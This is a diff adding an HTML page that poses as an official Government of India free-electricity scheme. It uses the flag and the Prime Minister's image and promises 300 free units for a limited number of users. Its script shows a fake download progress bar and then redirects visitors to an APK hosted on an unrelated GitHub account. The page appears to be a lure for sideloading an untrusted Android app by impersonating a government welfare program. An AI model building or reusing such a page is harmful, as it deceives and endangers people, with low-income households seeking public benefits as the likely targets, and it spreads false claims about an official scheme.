@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="मुफ्त बिजली योजना">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBTGeUXDFQLyXeRH-BiHpkQFP40NzuQPZhoQ&usqp=CAU">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PM Muft-Bijli</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #f4f7fc;
+            text-align: center;
+            padding-bottom: 70px;
+        }
+
+        .top-bar {
+            background: #015296;
+            color: white;
+            padding: 8px 15px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .top-bar img {
+            height: 20px;
+        }
+
+        .header {
+            background: white;
+            padding: 15px 10px;
+            text-align: center;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .header h1 {
+            font-size: 22px;
+            color: #015296;
+            font-weight: 700;
+        }
+
+        .hero {
+            background: linear-gradient(to right, #eef2f6, #ffffff);
+            padding: 30px 20px 20px 20px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1), 
+                        0px -4px 8px rgba(0, 0, 0, 0.1); /* Shadow on both top & bottom */
+            text-align: center;
+            position: relative;
+        }
+
+        .update-banner {
+            background: #ffcc00;
+            color: #000;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 6px 12px;
+            border: 2px solid #015296;
+            border-bottom: none;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            display: inline-block;
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero h1 {
+            font-size: 26px;
+            color: #000;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .hero h1 span {
+            color: #015296;
+        }
+
+        .hero p {
+            font-size: 16px;
+            color: #444;
+            margin-bottom: 10px;
+        }
+
+        .hero ul {
+            text-align: left;
+            max-width: 300px;
+            padding-left: 20px;
+            margin: 0 auto;
+        }
+
+        .hero ul li {
+            font-size: 15px;
+            margin-bottom: 6px;
+        }
+
+        .hero-image {
+            width: 150px;
+            margin-top: 20px;
+        }
+
+        .download-btn {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #015296;
+            color: white;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 700;
+            text-align: center;
+            text-decoration: none;
+            transition: background 0.3s;
+        }
+
+        .download-btn:hover {
+            background: #0055a5;
+        }
+
+        footer {
+            background: #015296;
+            color: white;
+            padding: 12px;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        /* Progress Bar */
+        .progress-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .progress-container {
+            width: 120px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: conic-gradient(#015296 0deg, #ccc 0deg);
+            position: relative;
+        }
+
+        .progress-container::before {
+            content: "";
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .progress-text {
+            position: absolute;
+            font-size: 16px;
+            font-weight: bold;
+            color: #015296;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <img src="https://pmsuryaghar.gov.in/assets/images/flag.svg" alt="India Flag">
+        Government of India
+    </div>
+
+    <div class="header">
+        <h1>Muft-Bijli Yojana: HarGhar Bijli</h1>
+    </div>
+
+    <div class="hero">
+        <div class="update-banner">Update App Now</div>
+
+        <h1>Muft-Bijli Yojana <br><span>HarGhar Bijli</span></h1>
+        <p><strong>Key Benefits:</strong></p>
+        <ul>
+            <li>Get 300 units of Free electricity per month.</li>
+            <li>Support for rented apartments.</li>
+            <li>Limited to 1-Crore users.</li>
+            <li>Download PMMB-Y app from below to register.</li>
+        </ul>
+        <p><strong style="font-size: 22px; font-weight: 600; color: #015296;">Shri Narendra Modi</strong><br>
+            <span style="font-size: 16px; color: black;">Honorable Prime Minister of India</span>
+        </p>
+        <img src="https://pmsuryaghar.gov.in/assets/images/narendra-modi.png" 
+             alt="PM Narendra Modi" class="hero-image">
+    </div>
+
+    <a id="downloadButton" href="#" class="download-btn">Update app</a>
+
+    <footer>
+        &copy; 2025 PM Muft-Bijli. All Rights Reserved.
+    </footer>
+
+    <!-- Progress Bar Overlay -->
+    <div class="progress-overlay" id="progressOverlay">
+        <div class="progress-container">
+            <div class="progress-text" id="progressText">0%</div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("downloadButton").addEventListener("click", function (event) {
+            event.preventDefault();
+            let overlay = document.getElementById("progressOverlay");
+            let progressText = document.getElementById("progressText");
+
+            overlay.style.display = "flex";
+
+            let progress = 0;
+            let interval = setInterval(() => {
+                progress += 10;
+                progressText.innerText = progress + "%";
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        overlay.style.display = "none";
+                        window.location.href = "https://github.com/Pmmbe/Dow/raw/refs/heads/main/PMMB-Y.apk";
+                    }, 500);
+                }
+            }, 200);
+        });
+    </script>
+</body>
+</html>
